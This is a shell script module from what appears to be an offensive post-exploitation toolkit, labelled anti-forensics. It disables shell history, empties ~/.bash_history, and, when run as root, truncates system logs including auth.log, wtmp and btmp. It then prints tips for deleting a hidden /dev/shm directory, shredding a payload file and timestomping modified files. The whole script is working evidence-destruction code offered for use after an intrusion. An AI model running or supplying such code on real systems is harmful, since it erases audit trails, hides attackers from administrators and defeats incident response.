# Anti-Forensics: Clear Tracks
# Usage: load evasion/clear_tracks.sh

print_header "Anti-Forensics"

# 1. Disable History for current session
unset HISTFILE
export HISTSIZE=0
export HISTFILESIZE=0
print_success "History disabled for current session."

# 2. Clear History File (Aggressive)
if [ -f ~/.bash_history ]; then
    print_with_label "Wiping ~/.bash_history..."
    cat /dev/null > ~/.bash_history && history -c
    print_success "~/.bash_history wiped."
else
    print_warning "~/.bash_history not found."
fi

# 3. Clear /var/log (Requires Root)
if is_root; then
    print_with_label "Clearing system logs (Root)..."
    echo > /var/log/syslog
    echo > /var/log/auth.log
    echo > /var/log/messages
    echo > /var/log/wtmp
    echo > /var/log/btmp
    print_success "System logs truncated."
else
    print_warning "Not root. Skipping system log clearing."
fi

# 4. Self-Destruct Script (Optional - usually handled by the loader, but good to have)
# This is more of a placeholder for manual cleanup instructions
print_with_label "Manual Cleanup Tips:"
echo "1. rm -rf /dev/shm/.hidden_dir"
echo "2. shred -u /tmp/payload"
echo "3. touch -r /bin/ls modified_file (Timestomp)"
